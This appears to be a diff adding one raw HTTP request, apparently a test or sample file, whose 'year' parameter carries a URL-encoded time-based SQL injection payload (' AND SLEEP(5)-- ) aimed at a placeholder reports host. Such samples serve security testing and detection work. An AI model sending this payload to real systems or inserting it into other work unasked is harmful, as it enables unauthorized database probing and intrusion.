@@ -1,0 +1,6 @@
+GET /report?year=2024%27%20AND%20SLEEP%285%29--%20&format=csv HTTP/1.1
+Host: reports.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Accept: text/csv
+Content-Length: 0
+
